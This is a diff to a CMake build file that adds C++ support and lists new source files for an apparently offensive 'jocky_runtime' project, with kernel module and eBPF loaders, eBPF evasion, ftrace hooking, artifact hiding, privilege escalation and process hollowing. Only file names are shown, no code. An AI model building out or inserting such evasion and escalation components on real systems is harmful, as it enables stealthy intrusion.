@@ -1,7 +1,8 @@
 cmake_minimum_required(VERSION 3.16)
-project(jocky_runtime C)
+project(jocky_runtime C CXX)
 
 set(CMAKE_C_STANDARD 11)
+set(CMAKE_CXX_STANDARD 14)
 
 # Runtime source files
 set(RUNTIME_SOURCES
@@ -39,6 +40,25 @@ set(RUNTIME_SOURCES
     linux/process_control_syscall.c
     linux/ipc_syscall.c
     linux/util_syscall.c
+    linux/kernel/lkm_loader.c
+    linux/kernel/lkm_loader.cpp
+    linux/kernel/ebpf_loader.c
+    linux/kernel/ebpf_evasion.cpp
+    linux/kernel/ftrace_helper.c
+    linux/kernel/ftrace_hooking.cpp
+    linux/kernel/modules.c
+    linux/kernel/advanced_syscalls.c
+    linux/kernel/advanced_kernel_ops.c
+    linux/anti_analysis/artifact_hiding.cpp
+    linux/anti_analysis/userland_evasion.cpp
+    linux/lpe/privilege_escalation.cpp
+    linux/lpe/fence2pwn.c
+    linux/process/hollow.c
+    linux/process/process_syscall.c
+    linux/process/process_control_syscall.c
+    linux/process/advanced_process_ops.c
+    linux/networking/network.c
+    linux/forensics/linux_forensics.c
 )
 
 # Platform-specific filtering
